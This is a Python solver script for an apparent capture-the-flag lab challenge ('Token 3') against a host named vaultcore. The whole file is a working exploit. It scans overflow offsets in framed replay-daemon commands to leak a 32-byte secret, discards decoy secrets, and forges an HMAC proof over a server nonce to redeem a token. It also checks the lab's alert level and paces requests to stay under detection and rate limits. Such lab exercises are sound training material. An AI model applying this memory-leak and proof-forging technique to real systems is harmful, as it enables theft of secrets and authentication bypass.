#!/usr/bin/env python3
"""
Token 3 Solver
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import struct
import time
import urllib.request
import urllib.error
import zlib

DEFAULT_VAULTCORE = "http://vaultcore.pccc:8080"


def http_json(method: str, url: str, *, obj=None, timeout=8.0):
    data = None
    headers = {"Accept": "application/json"}
    if obj is not None:
        data = json.dumps(obj).encode("utf-8")
        headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try:
                return r.status, dict(r.headers), json.loads(raw.decode("utf-8", errors="replace"))
            except Exception:
                return r.status, dict(r.headers), {"_raw": raw.decode("utf-8", errors="replace")}
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            j = json.loads(raw.decode("utf-8", errors="replace"))
        except Exception:
            j = {"_raw": raw.decode("utf-8", errors="replace")}
        return e.code, dict(e.headers), j
    except Exception as e:
        raise RuntimeError(f"{method} {url} -> network error: {e}") from None


def build_frame(cmd: bytes, cmd_data: bytes, *, ver=1, flags=0) -> bytes:
    payload = cmd + cmd_data
    header = b"RPLY" + bytes([ver, flags]) + struct.pack("<H", len(payload))
    crc = zlib.crc32(header + payload) & 0xFFFFFFFF
    return header + payload + struct.pack("<I", crc)


def parse_ok_secret(raw: bytes) -> bytes:
    if not raw.startswith(b"OK "):
        raise RuntimeError(f"unexpected replayd response prefix: {raw[:60]!r}")
    b64 = raw.split(b" ", 1)[1].strip()
    return base64.b64decode(b64)


def looks_like_arithmetic_ramp(b: bytes) -> bool:
    if len(b) < 8:
        return False
    deltas = [(b[i + 1] - b[i]) & 0xFF for i in range(len(b) - 1)]
    return all(d == deltas[0] for d in deltas)


def is_probably_fake(secret: bytes) -> bool:
    if len(secret) != 32:
        return True
    if len(set(secret)) <= 6:
        return True
    if looks_like_arithmetic_ramp(secret):
        return True
    if secret[:16] == secret[16:]:
        return True
    return False


def submit_frame(vaultcore: str, frame: bytes, *, timeout=8.0, max_retries=6):
    """
    Retries politely on 429 with backoff.
    """
    payload = {"frame_b64": base64.b64encode(frame).decode("ascii")}
    backoffs = [2, 5, 10, 20, 30, 45]

    for i in range(max_retries):
        status, headers, j = http_json("POST", f"{vaultcore}/api/ops/replay/submit", obj=payload, timeout=timeout)

        if status == 429:
            ra = headers.get("Retry-After")
            sleep_s = int(ra) if ra and ra.isdigit() else backoffs[min(i, len(backoffs) - 1)]
            print(f"[!] 429 Too Many Requests from /replay/submit. Sleeping {sleep_s}s…")
            time.sleep(sleep_s)
            continue

        if status >= 400:
            raise RuntimeError(f"POST /api/ops/replay/submit -> {status}: {j}")

        if not j.get("ok", False):
            raise RuntimeError(f"replay submit returned ok=false: {j}")

        resp_b64 = j.get("resp_b64", "")
        return base64.b64decode(resp_b64)

    raise RuntimeError("Exceeded retry budget due to repeated 429s. Wait ~65s and try again.")


def get_state(vaultcore: str) -> dict:
    status, _hdrs, j = http_json("GET", f"{vaultcore}/api/state", timeout=6.0)
    if status >= 400:
        raise RuntimeError(f"GET /api/state -> {status}: {j}")
    return j


def get_nonce(vaultcore: str) -> tuple[bytes, str, int]:
    status, _hdrs, j = http_json("GET", f"{vaultcore}/api/ops/ghost/challenge", timeout=6.0)
    if status >= 400:
        raise RuntimeError(f"GET /api/ops/ghost/challenge -> {status}: {j}")
    nonce_b64 = j["nonce_b64"]
    ttl = int(j.get("ttl_seconds", 45))
    return base64.b64decode(nonce_b64), nonce_b64, ttl


def redeem(vaultcore: str, proof_b64: str) -> dict:
    status, _hdrs, j = http_json("POST", f"{vaultcore}/api/ops/ghost/redeem", obj={"proof_b64": proof_b64}, timeout=6.0)
    if status == 429:
        raise RuntimeError("429 on redeem (unexpected). Wait ~65s and retry.")
    if status >= 400:
        raise RuntimeError(f"POST /api/ops/ghost/redeem -> {status}: {j}")
    return j


def get_slip(vaultcore: str) -> dict:
    status, _hdrs, j = http_json("GET", f"{vaultcore}/api/ops/maintenance/ghost-slip", timeout=6.0)
    if status >= 400:
        raise RuntimeError(f"GET /api/ops/maintenance/ghost-slip -> {status}: {j}")
    return j


def compute_proof_b64(nonce: bytes, secret: bytes) -> str:
    tag = hmac.new(secret, b"T3|" + nonce, hashlib.sha256).digest()
    return base64.b64encode(nonce + tag).decode("ascii")


def leak_secret(vaultcore: str, *, min_off: int, max_off: int, per_try_delay: float) -> bytes:
    print("[*] Benign STAT…")
    raw = submit_frame(vaultcore, build_frame(b"S", b"A" * 8))
    benign = parse_ok_secret(raw)
    print(f"[*] benign leak_len={len(benign)}")

    print(f"[*] Overflow scan offsets {min_off}..{max_off} (delay {per_try_delay}s)")
    for off in range(min_off, max_off + 1):
        cmd_data = b"A" * off + b"\x00" + b"B" * 24
        raw = submit_frame(vaultcore, build_frame(b"S", cmd_data))
        secret = parse_ok_secret(raw)

        if len(secret) == 32 and not is_probably_fake(secret):
            print(f"[+] REAL secret at offset={off}")
            print(f"[+] secret_hex={secret.hex()}")
            return secret

        time.sleep(per_try_delay)

    raise RuntimeError("Failed to leak non-fake secret in chosen offset range.")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--vaultcore", default=DEFAULT_VAULTCORE)
    ap.add_argument("--min-off", type=int, default=55)   # tight default
    ap.add_argument("--max-off", type=int, default=70)   # tight default
    ap.add_argument("--delay", type=float, default=0.35) # polite pacing
    args = ap.parse_args()

    vaultcore = args.vaultcore.rstrip("/")
    print(f"[*] VAULTCORE={vaultcore}")

    st = get_state(vaultcore)
    lvl = st["alert"]["level"]
    score = st["alert"]["score"]
    state = st["alert"]["state"]
    print(f"[*] alert.level={lvl} score={score} state={state}")
    if lvl > 3:
        print("[!] Too hot for Token3 gates. Wait for decay before running solver.")
        return 2

    secret = leak_secret(vaultcore, min_off=args.min_off, max_off=args.max_off, per_try_delay=args.delay)

    # Get nonce right before redeem
    nonce, nonce_b64, ttl = get_nonce(vaultcore)
    print(f"[*] nonce_b64={nonce_b64} ttl={ttl}s")

    proof_b64 = compute_proof_b64(nonce, secret)
    res = redeem(vaultcore, proof_b64)
    print(f"[+] redeem={res}")

    slip = get_slip(vaultcore)
    print("\n=== TOKEN 3 SLIP ===")
    print(json.dumps(slip, indent=2))
    if "auth" in slip:
        print("\n[+] TOKEN 3:", slip["auth"])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())